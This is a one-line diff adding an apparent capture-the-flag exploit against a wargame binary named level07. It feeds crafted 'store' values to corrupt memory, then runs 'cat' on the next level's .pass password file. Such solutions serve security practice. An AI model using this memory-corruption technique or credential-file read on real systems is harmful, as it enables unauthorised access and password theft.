@@ -1,0 +1,1 @@
+(python -c 'print("store")'; python -c 'print("4159090384")'; python -c 'print("1073741938")'; python -c 'print("store")';python -c 'print("4160264172")'; python -c 'print("116")'; python -c 'print("quit")'; echo "cat /home/users/level08/.pass") | ./level07
